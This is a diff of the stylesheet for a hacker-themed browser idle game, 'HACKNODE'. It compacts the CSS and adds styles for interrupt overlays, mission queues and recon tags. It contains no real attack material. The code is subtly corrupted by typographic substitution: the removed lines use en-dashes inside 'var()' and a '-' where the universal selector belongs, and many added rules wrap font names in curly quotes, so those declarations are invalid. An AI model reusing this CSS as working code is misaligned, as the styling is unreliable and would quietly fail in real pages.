@@ -3,1945 +3,1296 @@
 <html lang="en" style="background:#050a05;">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>HACKNODE</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --green: #00ff41;
-    --green-dim: #00aa2a;
-    --green-dark: #003a0f;
-    --amber: #ffb700;
-    --red: #ff2d2d;
-    --blue: #00d4ff;
-    --bg: #050a05;
-    --bg2: #080f08;
-    --bg3: #0d180d;
-    --border: #1a3a1a;
-    --text-dim: #4a7a4a;
-    --scan-line: rgba(0,255,65,0.03);
+    --green:#00ff41;--gdim:#00aa2a;--gdark:#003a0f;
+    --amber:#ffb700;--red:#ff2d2d;--blue:#00d4ff;--purple:#cc44ff;
+    --bg:#050a05;--bg2:#080f08;--bg3:#0d180d;--border:#1a3a1a;--dim:#4a7a4a;
   }
-
-- { margin: 0; padding: 0; box-sizing: border-box; }
-
-html, body {
-height: 100%;
-background: #050a05;
-background: var(–bg);
-color: var(–green);
-font-family: ‘Share Tech Mono’, monospace;
-overflow: hidden;
--webkit-user-select: none;
-user-select: none;
-}
-
-/* CRT and vignette are real divs now for Safari compat */
-
-#crt-overlay {
-position: fixed;
-top: 0; left: 0; right: 0; bottom: 0;
-background: repeating-linear-gradient(
-0deg,
-transparent,
-transparent 2px,
-rgba(0,255,65,0.03) 2px,
-rgba(0,255,65,0.03) 4px
-);
-pointer-events: none;
-z-index: 9999;
-}
-
-#vignette-overlay {
-position: fixed;
-top: 0; left: 0; right: 0; bottom: 0;
-background: -webkit-radial-gradient(center, ellipse, transparent 60%, rgba(0,0,0,0.75) 100%);
-background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.75) 100%);
-pointer-events: none;
-z-index: 9998;
-}
-
-#app {
-display: -webkit-flex;
-display: flex;
--webkit-flex-direction: column;
-flex-direction: column;
-height: 100vh;
-height: 100dvh;
-max-width: 480px;
-margin: 0 auto;
-border-left: 1px solid var(–border);
-border-right: 1px solid var(–border);
-position: relative;
-}
-
-/* ── HEADER ── */
-#header {
-padding: 8px 12px;
-background: var(–bg2);
-border-bottom: 1px solid var(–border);
-display: -webkit-flex;
-display: flex;
--webkit-flex-direction: column;
-flex-direction: column;
-gap: 6px;
--webkit-flex-shrink: 0;
-flex-shrink: 0;
-}
-
-#header-top {
-display: -webkit-flex;
-display: flex;
--webkit-justify-content: space-between;
-justify-content: space-between;
--webkit-align-items: center;
-align-items: center;
-}
-
-#logo {
-font-family: ‘Orbitron’, monospace;
-font-size: 16px;
-font-weight: 900;
-letter-spacing: 4px;
-color: var(–green);
-text-shadow: 0 0 10px var(–green), 0 0 20px var(–green);
-}
-
-#alias-display {
-font-size: 11px;
-color: var(–green-dim);
-}
-
-#alias-display span {
-color: var(–amber);
-}
-
-#stats-row {
-display: -webkit-flex;
-display: flex;
-gap: 12px;
-font-size: 10px;
-color: #4a7a4a;
-color: var(–text-dim);
-}
-
-#stats-row .stat-val {
-color: var(–green);
-}
-
-/* ── HEAT BAR ── */
-#heat-bar-wrap {
-display: -webkit-flex;
-display: flex;
--webkit-align-items: center;
-align-items: center;
-gap: 8px;
-font-size: 10px;
-}
-
-#heat-label {
-color: var(–text-dim);
-width: 36px;
-flex-shrink: 0;
-}
-
-#heat-track {
-flex: 1;
-height: 6px;
-background: var(–bg3);
-border: 1px solid var(–border);
-border-radius: 2px;
-overflow: hidden;
-}
-
-#heat-fill {
-height: 100%;
-width: 0%;
-background: var(–green);
-transition: width 0.3s, background 0.3s;
-border-radius: 2px;
-}
-
-#heat-pct {
-width: 32px;
-text-align: right;
-color: var(–green);
-font-size: 10px;
-}
-
-/* ── TERMINAL ── */
-#terminal {
--webkit-flex: 1;
-flex: 1;
-overflow-y: auto;
--webkit-overflow-scrolling: touch;
-padding: 10px 12px;
-background: var(–bg);
-font-size: 12px;
-line-height: 1.7;
-scroll-behavior: smooth;
-}
-
-#terminal::-webkit-scrollbar { width: 4px; }
-#terminal::-webkit-scrollbar-track { background: var(–bg); }
-#terminal::-webkit-scrollbar-thumb { background: var(–green-dark); border-radius: 2px; }
-
-.log-line { display: block; word-break: break-all; }
-.log-sys { color: var(–text-dim); }
-.log-cmd { color: var(–green); }
-.log-ok { color: var(–green); }
-.log-warn { color: var(–amber); }
-.log-err { color: var(–red); }
-.log-info { color: var(–blue); }
-.log-dim { color: var(–text-dim); }
-.log-sep { color: var(–border); }
-
-/* ── COMMAND INPUT AREA ── */
-#cmd-area {
-background: var(–bg2);
-border-top: 1px solid var(–border);
-padding: 10px 12px;
--webkit-flex-shrink: 0;
-flex-shrink: 0;
-}
-
-#cmd-display {
-font-size: 12px;
-min-height: 20px;
-margin-bottom: 8px;
-color: #00aa2a;
-color: var(–green-dim);
-display: -webkit-flex;
-display: flex;
--webkit-align-items: center;
-align-items: center;
-gap: 4px;
-}
-
-#cmd-prompt { color: var(–text-dim); }
-#cmd-text { color: var(–green); }
-#cmd-cursor {
-width: 8px;
-height: 14px;
-background: var(–green);
-display: inline-block;
-animation: blink 1s step-end infinite;
-}
-
-@keyframes blink { 50% { opacity: 0; } }
-
-/* ── PROGRESS BAR ── */
-#progress-wrap {
-display: none;
-margin-bottom: 8px;
-gap: 8px;
--webkit-align-items: center;
-align-items: center;
-font-size: 10px;
-}
-
-#progress-wrap.active { display: -webkit-flex; display: flex; }
-
-#progress-label { color: var(–text-dim); min-width: 60px; }
-
-#progress-track {
-flex: 1;
-height: 8px;
-background: var(–bg3);
-border: 1px solid var(–border);
-border-radius: 2px;
-overflow: hidden;
-}
-
-#progress-fill {
-height: 100%;
-width: 0%;
-background: linear-gradient(90deg, var(–green-dark), var(–green));
-transition: width 0.1s;
-border-radius: 2px;
-box-shadow: 0 0 6px var(–green);
-}
-
-#progress-pct {
-color: var(–green);
-width: 36px;
-text-align: right;
-}
-
-/* Global button reset for Safari */
-button {
--webkit-appearance: none;
--moz-appearance: none;
-appearance: none;
-border-radius: 4px;
--webkit-tap-highlight-color: transparent;
-touch-action: manipulation;
-}
-
-/* ── ACTION BUTTON ── */
-#tap-btn {
-width: 100%;
-padding: 14px;
-background: #0d180d;
-background: var(–bg3);
-border: 1px solid #003a0f;
-border: 1px solid var(–green-dark);
-border-radius: 4px;
-color: #00ff41;
-color: var(–green);
-font-family: ‘Share Tech Mono’, monospace;
-font-size: 13px;
-letter-spacing: 2px;
-cursor: pointer;
--webkit-transition: all 0.1s;
-transition: all 0.1s;
-text-transform: uppercase;
-position: relative;
-overflow: hidden;
--webkit-appearance: none;
-appearance: none;
--webkit-tap-highlight-color: transparent;
-touch-action: manipulation;
-display: block;
-box-sizing: border-box;
-}
-
-#tap-btn:active {
-background: #003a0f;
-background: var(–green-dark);
--webkit-transform: scale(0.98);
-transform: scale(0.98);
-box-shadow: 0 0 12px #00ff41;
-box-shadow: 0 0 12px var(–green);
-}
-
-#tap-btn.idle-mode {
-border-color: #4a7a4a;
-border-color: var(–text-dim);
-color: #4a7a4a;
-color: var(–text-dim);
-font-size: 11px;
-}
-
-#tap-btn.no-mission {
-border-color: #1a3a1a;
-border-color: var(–border);
-color: #4a7a4a;
-color: var(–text-dim);
-}
-
-#tap-btn.locked-out {
-opacity: 0.4;
-pointer-events: none;
-}
-
-/* ── BOTTOM NAV ── */
-#bottom-nav {
-display: -webkit-flex;
-display: flex;
-border-top: 1px solid var(–border);
-background: var(–bg2);
--webkit-flex-shrink: 0;
-flex-shrink: 0;
-}
-
-.nav-btn {
--webkit-flex: 1;
-flex: 1;
-padding: 12px 4px;
-background: transparent;
-border: none;
-border-right: 1px solid #1a3a1a;
-border-right: 1px solid var(–border);
-color: #4a7a4a;
-color: var(–text-dim);
-font-family: ‘Share Tech Mono’, monospace;
-font-size: 10px;
-letter-spacing: 1px;
-cursor: pointer;
-text-transform: uppercase;
--webkit-transition: color 0.2s, background 0.2s;
-transition: color 0.2s, background 0.2s;
--webkit-appearance: none;
-appearance: none;
--webkit-tap-highlight-color: transparent;
-touch-action: manipulation;
-}
-
-.nav-btn:last-child { border-right: none; }
-.nav-btn.active { color: var(–green); background: var(–bg3); }
-.nav-btn:active { background: var(–green-dark); color: var(–green); }
-
-/* ── PANELS ── */
-#panel {
-display: none;
-position: fixed;
-bottom: 0;
-left: 50%;
--webkit-transform: translateX(-50%);
-transform: translateX(-50%);
-width: 100%;
-max-width: 480px;
-background: #080f08;
-background: var(–bg2);
-border-top: 2px solid var(–green-dark);
-max-height: 65vh;
-overflow-y: auto;
-z-index: 200;
--webkit-overflow-scrolling: touch;
-}
-
-#panel.open { display: block; }
-#panel::-webkit-scrollbar { width: 4px; }
-#panel::-webkit-scrollbar-thumb { background: var(–green-dark); }
-
-.panel-header {
-padding: 12px;
-border-bottom: 1px solid var(–border);
-font-family: ‘Orbitron’, monospace;
-font-size: 12px;
-letter-spacing: 3px;
-color: var(–green-dim);
-display: flex;
-justify-content: space-between;
-align-items: center;
-position: sticky;
-top: 0;
-background: var(–bg2);
-z-index: 1;
-}
-
-.panel-close {
-background: none;
-border: none;
-color: var(–text-dim);
-font-family: ‘Share Tech Mono’, monospace;
-font-size: 16px;
-cursor: pointer;
-padding: 0 4px;
-}
-
-/* ── MISSIONS ── */
-.mission-card {
-margin: 10px 12px;
-padding: 12px;
-border: 1px solid var(–border);
-border-radius: 4px;
-background: var(–bg);
-cursor: pointer;
-transition: border-color 0.2s, background 0.2s;
-}
-
-.mission-card:active { background: var(–bg3); border-color: var(–green-dark); }
-.mission-card.active-mission { border-color: var(–green); background: var(–bg3); }
-.mission-card.locked { opacity: 0.4; cursor: not-allowed; }
-
-.mission-title {
-font-size: 12px;
-color: var(–green);
-margin-bottom: 4px;
-display: flex;
-justify-content: space-between;
-}
-
-.mission-type-tag {
-font-size: 9px;
-padding: 1px 6px;
-border-radius: 2px;
-background: var(–green-dark);
-color: var(–green);
-}
-
-.mission-type-tag.exfil { background: #001a3a; color: var(–blue); }
-.mission-type-tag.crack { background: #2a0000; color: var(–red); }
-
-.mission-desc { font-size: 10px; color: var(–text-dim); margin-bottom: 6px; }
-
-.mission-meta {
-display: flex;
-gap: 12px;
-font-size: 10px;
-}
-
-.mission-meta span { color: var(–text-dim); }
-.mission-meta .val { color: var(–amber); }
-
-/* ── UPGRADES ── */
-.upgrade-section {
-padding: 10px 12px 4px;
-font-size: 10px;
-color: var(–text-dim);
-letter-spacing: 2px;
-text-transform: uppercase;
-}
-
-.upgrade-card {
-margin: 6px 12px;
-padding: 10px 12px;
-border: 1px solid var(–border);
-border-radius: 4px;
-background: var(–bg);
-cursor: pointer;
-transition: all 0.15s;
-display: flex;
-justify-content: space-between;
-align-items: center;
-}
-
-.upgrade-card:active { background: var(–bg3); }
-.upgrade-card.maxed { opacity: 0.5; cursor: not-allowed; }
-.upgrade-card.cant-afford { opacity: 0.6; }
-
-.upgrade-info { flex: 1; }
-.upgrade-name { font-size: 12px; color: var(–green); margin-bottom: 2px; }
-.upgrade-desc { font-size: 10px; color: var(–text-dim); }
-
-.upgrade-cost {
-text-align: right;
-font-size: 11px;
-}
-
-.upgrade-cost .cost-val { color: var(–amber); }
-.upgrade-cost .tier-dots { color: var(–text-dim); font-size: 9px; }
-
-/* ── PRESTIGE ── */
-#prestige-section {
-margin: 12px;
-padding: 16px;
-border: 1px solid var(–red);
-border-radius: 4px;
-background: rgba(255,45,45,0.05);
-}
-
-#prestige-title {
-font-family: ‘Orbitron’, monospace;
-font-size: 13px;
-color: var(–red);
-margin-bottom: 8px;
-letter-spacing: 2px;
-}
-
-#prestige-desc { font-size: 11px; color: var(–text-dim); margin-bottom: 12px; line-height: 1.6; }
-
-#prestige-btn {
-width: 100%;
-padding: 12px;
-background: transparent;
-border: 1px solid var(–red);
-border-radius: 4px;
-color: var(–red);
-font-family: ‘Share Tech Mono’, monospace;
-font-size: 12px;
-letter-spacing: 3px;
-cursor: pointer;
-transition: all 0.2s;
-text-transform: uppercase;
-}
-
-#prestige-btn:active { background: rgba(255,45,45,0.2); }
-#prestige-btn:disabled { opacity: 0.3; cursor: not-allowed; }
-
-#rep-display {
-text-align: center;
-margin: 12px;
-font-size: 11px;
-color: var(–text-dim);
-}
-
-#rep-display .rep-val {
-color: var(–amber);
-font-size: 14px;
-font-family: ‘Orbitron’, monospace;
-}
-
-/* ── OFFLINE MODAL ── */
-#offline-modal {
-display: none;
-position: fixed;
-top: 0; left: 0; right: 0; bottom: 0;
-background: rgba(0,0,0,0.85);
-z-index: 1000;
--webkit-align-items: center;
-align-items: center;
--webkit-justify-content: center;
-justify-content: center;
-}
-
-#offline-modal.show { display: -webkit-flex; display: flex; }
-
-#offline-box {
-background: var(–bg2);
-border: 1px solid var(–green-dark);
-border-radius: 4px;
-padding: 20px;
-max-width: 320px;
-width: 90%;
-}
-
-#offline-box h2 {
-font-family: ‘Orbitron’, monospace;
-font-size: 13px;
-color: var(–green);
-letter-spacing: 3px;
-margin-bottom: 12px;
-}
-
-#offline-log {
-font-size: 11px;
-line-height: 1.8;
-color: var(–text-dim);
-margin-bottom: 16px;
-max-height: 200px;
-overflow-y: auto;
-}
-
-#offline-log .hi { color: var(–green); }
-
-#offline-ok {
-width: 100%;
-padding: 12px;
-background: var(–green-dark);
-border: 1px solid var(–green);
-border-radius: 4px;
-color: var(–green);
-font-family: ‘Share Tech Mono’, monospace;
-font-size: 12px;
-letter-spacing: 2px;
-cursor: pointer;
-}
-
-/* ── FLASH FX ── */
-.credit-flash {
-position: fixed;
-pointer-events: none;
-font-family: ‘Orbitron’, monospace;
-font-size: 13px;
-color: var(–amber);
-text-shadow: 0 0 8px var(–amber);
-z-index: 500;
-animation: floatUp 1.2s ease-out forwards;
-}
-
-@keyframes floatUp {
-0% { opacity: 1; transform: translateY(0); }
-100% { opacity: 0; transform: translateY(-40px); }
-}
-
-/* Glitch on prestige */
-@keyframes glitch {
-0%,100% { transform: translate(0); filter: none; }
-20% { transform: translate(-4px, 2px); filter: hue-rotate(90deg); }
-40% { transform: translate(4px, -2px); filter: hue-rotate(180deg) brightness(2); }
-60% { transform: translate(-2px, 4px); filter: hue-rotate(270deg); }
-80% { transform: translate(2px, -4px); filter: brightness(3); }
-}
-
-.glitching { animation: glitch 0.4s ease forwards; }
-
-/* Boot sequence */
-#boot-screen {
-position: fixed;
-top: 0; left: 0; right: 0; bottom: 0;
-background: #050a05;
-background: var(–bg);
-z-index: 2000;
-display: -webkit-flex;
-display: flex;
--webkit-align-items: center;
-align-items: center;
--webkit-justify-content: center;
-justify-content: center;
--webkit-flex-direction: column;
-flex-direction: column;
-gap: 16px;
-}
-
-#boot-logo {
-font-family: ‘Orbitron’, monospace;
-font-size: 28px;
-font-weight: 900;
-letter-spacing: 8px;
-color: var(–green);
-text-shadow: 0 0 20px var(–green), 0 0 40px var(–green);
-animation: pulse 1s ease-in-out infinite;
-}
-
-@keyframes pulse { 50% { text-shadow: 0 0 40px var(–green), 0 0 80px var(–green); } }
-
-#boot-status { font-size: 11px; color: var(–text-dim); letter-spacing: 2px; }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html,body{height:100%;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace;overflow:hidden;-webkit-user-select:none;user-select:none;}
+  #crt{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.025) 2px,rgba(0,255,65,.025) 4px);}
+  #vig{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:9998;background:-webkit-radial-gradient(center,ellipse,transparent 55%,rgba(0,0,0,.8) 100%);background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.8) 100%);}
+
+#app{display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;height:100vh;height:100dvh;max-width:480px;margin:0 auto;border-left:1px solid #1a3a1a;border-right:1px solid #1a3a1a;}
+
+/* HEADER */
+#hdr{padding:7px 12px;background:#080f08;border-bottom:1px solid #1a3a1a;display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;gap:4px;-webkit-flex-shrink:0;flex-shrink:0;}
+#hdr-top{display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;}
+#logo{font-family:‘Orbitron’,monospace;font-size:15px;font-weight:900;letter-spacing:4px;color:#00ff41;text-shadow:0 0 10px #00ff41,0 0 20px #00ff41;}
+#alias{font-size:10px;color:#4a7a4a;}
+#alias span{color:#ffb700;}
+#stats{display:-webkit-flex;display:flex;gap:9px;font-size:10px;color:#4a7a4a;-webkit-flex-wrap:wrap;flex-wrap:wrap;}
+#stats .sv{color:#00ff41;}
+#qind{font-size:10px;color:#4a7a4a;display:none;}
+#qind.on{display:block;}
+#qind span{color:#00d4ff;}
+#heatrow{display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:8px;font-size:10px;}
+#hlbl{color:#4a7a4a;width:36px;-webkit-flex-shrink:0;flex-shrink:0;}
+#htrk{-webkit-flex:1;flex:1;height:5px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
+#hfill{height:100%;width:0%;background:#00ff41;border-radius:2px;-webkit-transition:width .3s,background .3s;transition:width .3s,background .3s;}
+#hpct{width:30px;text-align:right;color:#00ff41;font-size:10px;}
+
+/* TERMINAL */
+#term{-webkit-flex:1;flex:1;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
+#term::-webkit-scrollbar{width:3px;}
+#term::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
+.ll{display:block;word-break:break-all;}
+.ok{color:#00ff41;}.warn{color:#ffb700;}.err{color:#ff2d2d;}.info{color:#00d4ff;}.dim{color:#4a7a4a;}.sep{color:#1a3a1a;}.proc{color:#cc44ff;}.story{color:#ffb700;font-style:italic;}
+
+/* CMD AREA */
+#cmd-area{background:#080f08;border-top:1px solid #1a3a1a;padding:7px 12px;-webkit-flex-shrink:0;flex-shrink:0;}
+#phlbl{font-size:9px;letter-spacing:2px;color:#4a7a4a;margin-bottom:3px;display:none;}
+#phlbl.on{display:block;}
+#phlbl.proc{color:#cc44ff;}
+
+/* countdown */
+#countdown{font-size:11px;color:#cc44ff;margin-bottom:4px;display:none;text-align:center;letter-spacing:2px;}
+#countdown.on{display:block;}
+
+#progwrap{display:none;margin-bottom:5px;gap:8px;-webkit-align-items:center;align-items:center;font-size:10px;}
+#progwrap.on{display:-webkit-flex;display:flex;}
+#proglbl{color:#4a7a4a;min-width:52px;font-size:9px;letter-spacing:1px;}
+#progtrk{-webkit-flex:1;flex:1;height:8px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
+#progfill{height:100%;width:0%;background:linear-gradient(90deg,#003a0f,#00ff41);-webkit-transition:width .15s;transition:width .15s;border-radius:2px;box-shadow:0 0 5px #00ff41;}
+#progfill.proc{background:linear-gradient(90deg,#330055,#cc44ff);box-shadow:0 0 5px #cc44ff;}
+#progpct{color:#00ff41;width:34px;text-align:right;}
+
+/* pre-stage area */
+#prestage{display:none;margin-bottom:5px;padding:6px 8px;border:1px dashed #1a3a1a;border-radius:3px;background:rgba(0,255,65,.03);}
+#prestage.on{display:block;}
+#prestage-lbl{font-size:9px;color:#4a7a4a;letter-spacing:1px;margin-bottom:3px;}
+#prestage-cmd{font-size:11px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:3px;overflow:hidden;}
+#prestage-prompt{color:#4a7a4a;-webkit-flex-shrink:0;flex-shrink:0;font-size:10px;}
+#prestage-typed{color:#00ff41;}
+#prestage-rest{color:#1a3a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+#prestage-cursor{width:6px;height:12px;background:#00aa2a;display:inline-block;-webkit-flex-shrink:0;flex-shrink:0;animation:blink 1s step-end infinite;}
+
+#cmddisplay{font-size:11px;min-height:17px;margin-bottom:6px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:4px;overflow:hidden;}
+#cmdprompt{color:#4a7a4a;-webkit-flex-shrink:0;flex-shrink:0;}
+#cmdtxt{color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+#cmdcursor{width:7px;height:13px;background:#00ff41;display:inline-block;-webkit-flex-shrink:0;flex-shrink:0;animation:blink 1s step-end infinite;}
+@keyframes blink{50%{opacity:0;}}
+
+/* BUTTONS */
+button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;touch-action:manipulation;border-radius:4px;}
+#tapbtn{width:100%;padding:13px;background:#0d180d;border:1px solid #003a0f;color:#00ff41;font-family:‘Share Tech Mono’,monospace;font-size:13px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;display:block;-webkit-appearance:none;appearance:none;-webkit-transition:all .1s;transition:all .1s;}
+#tapbtn:active{background:#003a0f;-webkit-transform:scale(.98);transform:scale(.98);box-shadow:0 0 10px #00ff41;}
+#tapbtn.proc{border-color:#330055;color:#cc44ff;background:#0d0018;}
+#tapbtn.none{border-color:#1a3a1a;color:#4a7a4a;}
+#tapbtn.idle{border-color:#4a7a4a;color:#4a7a4a;font-size:11px;}
+#tapbtn.locked{opacity:.3;pointer-events:none;}
+#tapbtn.interrupt{border-color:#ff2d2d;color:#ff2d2d;background:#1a0000;animation:pulse-red .6s ease-in-out infinite;}
+@keyframes pulse-red{50%{box-shadow:0 0 15px #ff2d2d;}}
+
+/* INTERRUPT OVERLAY */
+#interrupt-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:500;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;}
+#interrupt-overlay.on{display:-webkit-flex;display:flex;}
+#intbox{background:#080f08;border:2px solid #ff2d2d;border-radius:6px;padding:20px;max-width:340px;width:92%;box-shadow:0 0 30px rgba(255,45,45,.3);}
+#int-title{font-family:‘Orbitron’,monospace;font-size:13px;color:#ff2d2d;letter-spacing:3px;margin-bottom:8px;}
+#int-body{font-size:11px;color:#4a7a4a;margin-bottom:14px;line-height:1.7;}
+#int-timer{font-size:20px;font-family:‘Orbitron’,monospace;color:#ff2d2d;text-align:center;margin-bottom:14px;letter-spacing:4px;}
+#int-actions{display:-webkit-flex;display:flex;gap:8px;-webkit-flex-direction:column;flex-direction:column;}
+.int-btn{padding:12px;background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;border-radius:4px;-webkit-transition:all .1s;transition:all .1s;text-align:left;}
+.int-btn:active{background:rgba(255,45,45,.15);}
+.int-btn.safe{border-color:#00d4ff;color:#00d4ff;}
+.int-btn.safe:active{background:rgba(0,212,255,.1);}
+.int-btn.risky{border-color:#ffb700;color:#ffb700;}
+.int-btn.risky:active{background:rgba(255,183,0,.1);}
+
+/* NAV */
+#botnav{display:-webkit-flex;display:flex;border-top:1px solid #1a3a1a;background:#080f08;-webkit-flex-shrink:0;flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0px);}
+.nb{-webkit-flex:1;flex:1;padding:11px 4px;background:transparent;border:none;border-right:1px solid #1a3a1a;color:#4a7a4a;font-family:‘Share Tech Mono’,monospace;font-size:10px;letter-spacing:1px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;-webkit-transition:color .2s,background .2s;transition:color .2s,background .2s;}
+.nb:last-child{border-right:none;}
+.nb.act{color:#00ff41;background:#0d180d;}
+.nb:active{background:#003a0f;color:#00ff41;}
+
+/* PANEL */
+#panel{display:none;position:fixed;bottom:0;left:50%;-webkit-transform:translateX(-50%);transform:translateX(-50%);width:100%;max-width:480px;background:#080f08;border-top:2px solid #003a0f;max-height:68vh;z-index:200;padding-bottom:env(safe-area-inset-bottom,0px);-webkit-flex-direction:column;flex-direction:column;}
+#panel.on{display:-webkit-flex;display:flex;}
+#panel-content{-webkit-flex:1;flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;}
+#panel-content::-webkit-scrollbar{width:3px;}
+#panel-content::-webkit-scrollbar-thumb{background:#003a0f;}
+.phdr{padding:11px 12px;border-bottom:1px solid #1a3a1a;font-family:‘Orbitron’,monospace;font-size:11px;letter-spacing:3px;color:#00aa2a;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;-webkit-flex-shrink:0;flex-shrink:0;background:#080f08;}
+.pclose{background:none;border:none;color:#4a7a4a;font-size:16px;cursor:pointer;font-family:‘Share Tech Mono’,monospace;padding:0 4px;-webkit-appearance:none;appearance:none;}
+
+/* MISSION CARDS */
+.mc{margin:8px 10px;padding:11px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;position:relative;-webkit-transition:border-color .2s,background .2s;transition:border-color .2s,background .2s;}
+.mc:active{background:#0d180d;border-color:#003a0f;}
+.mc.queued{border-color:#00d4ff;}
+.mc.active-m{border-color:#00ff41;background:#0d180d;}
+.mc.locked{opacity:.35;cursor:not-allowed;}
+.mc.intel{border-color:#ffb700;}
+.mtitle{font-size:12px;color:#00ff41;margin-bottom:3px;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:flex-start;align-items:flex-start;gap:8px;}
+.mtag{font-size:9px;padding:1px 5px;border-radius:2px;background:#003a0f;color:#00ff41;-webkit-flex-shrink:0;flex-shrink:0;}
+.mtag.exfil{background:#001a3a;color:#00d4ff;}
+.mtag.crack{background:#2a0000;color:#ff2d2d;}
+.mtag.recon{background:#1a1a00;color:#ffb700;}
+.mdesc{font-size:10px;color:#4a7a4a;margin-bottom:5px;line-height:1.4;}
+.mmeta{display:-webkit-flex;display:flex;gap:10px;font-size:10px;-webkit-flex-wrap:wrap;flex-wrap:wrap;}
+.mmeta span{color:#4a7a4a;}
+.mmeta .v{color:#ffb700;}
+.qbadge{position:absolute;top:8px;right:36px;font-size:9px;color:#00d4ff;letter-spacing:1px;}
+.intel-badge{position:absolute;top:8px;right:36px;font-size:9px;color:#ffb700;letter-spacing:1px;}
+.pbar-row{display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:6px;font-size:9px;margin-top:4px;}
+.pbar-lbl{color:#4a7a4a;width:40px;}
+.pbar-trk{-webkit-flex:1;flex:1;height:3px;background:#0d180d;border:1px solid #1a3a1a;border-radius:1px;overflow:hidden;}
+.pbar-fill{height:100%;background:#003a0f;border-radius:1px;}
+
+/* UPGRADES */
+.usec{padding:9px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;}
+.usec:first-child{border-top:none;}
+.uc{margin:5px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;-webkit-transition:all .15s;transition:all .15s;}
+.uc:active{background:#0d180d;}
+.uc.maxed{opacity:.45;cursor:not-allowed;}
+.uc.broke{opacity:.55;}
+.uinfo{-webkit-flex:1;flex:1;}
+.uname{font-size:12px;color:#00ff41;margin-bottom:2px;}
+.udesc{font-size:10px;color:#4a7a4a;}
+.ucost{text-align:right;font-size:11px;}
+.ucost .cv{color:#ffb700;}
+
+/* SYSTEM */
+#repdisp{text-align:center;margin:12px;font-size:11px;color:#4a7a4a;}
+#repdisp .rv{color:#ffb700;font-size:14px;font-family:‘Orbitron’,monospace;}
+#pressec{margin:10px;padding:14px;border:1px solid #ff2d2d;border-radius:4px;background:rgba(255,45,45,.04);}
+#prestitle{font-family:‘Orbitron’,monospace;font-size:12px;color:#ff2d2d;margin-bottom:8px;letter-spacing:2px;}
+#presdesc{font-size:11px;color:#4a7a4a;margin-bottom:12px;line-height:1.6;}
+#presbtn{width:100%;padding:11px;background:transparent;border:1px solid #ff2d2d;border-radius:4px;color:#ff2d2d;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:3px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;}
+#presbtn:active{background:rgba(255,45,45,.15);}
+#presbtn:disabled{opacity:.3;cursor:not-allowed;}
+
+/* OFFLINE */
+#offmod{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.88);z-index:1000;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;}
+#offmod.on{display:-webkit-flex;display:flex;}
+#offbox{background:#080f08;border:1px solid #003a0f;border-radius:4px;padding:20px;max-width:320px;width:90%;}
+#offbox h2{font-family:‘Orbitron’,monospace;font-size:12px;color:#00ff41;letter-spacing:3px;margin-bottom:12px;}
+#offlog{font-size:11px;line-height:1.8;color:#4a7a4a;margin-bottom:16px;}
+#offlog .hi{color:#00ff41;}
+#offok{width:100%;padding:11px;background:#003a0f;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;-webkit-appearance:none;appearance:none;}
+
+/* FX */
